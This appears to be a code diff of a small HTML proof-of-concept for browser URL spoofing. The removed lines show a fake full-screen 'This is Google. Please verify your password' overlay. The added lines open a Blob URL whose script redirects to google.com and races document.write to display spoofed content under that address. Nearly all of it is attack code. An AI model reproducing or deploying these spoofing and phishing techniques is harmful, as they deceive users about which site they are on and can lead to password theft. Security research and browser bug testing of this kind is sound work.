@@ -1,12 +1,21 @@
 <script>
-    window.onbeforeunload = function (e) {
-        document.body.innerHTML = `
-      <div style="position:fixed; top:0; left:0; width:100%; height:100%; background:white; z-index:9999;">
-        <h1>This is Google. Please verify your password.</h1>
-        <input type="password" />
-      </div>
+    function spoofBlob() {
+        let payload = `
+      <script>
+        // Paksa ganti URL ke target tanpa menambah history
+        location.replace('https://www.google.com/');
+        
+        // Coba race condition lagi dari dalam konteks Blob
+        setTimeout(() => {
+          document.write('<h1>Google Spoofed from Blob!</h1>');
+          document.close();
+        }, 10);
+      <\/script>
     `;
-    };
-</script>
 
-<a href="https://www.google.com/">Go to Google</a>
+        let blob = new Blob([payload], { type: 'text/html' });
+        let url = URL.createObjectURL(blob);
+        window.open(url, "_blank");
+    }
+</script>
+<button onclick="spoofBlob()">Test Blob Spoof</button>
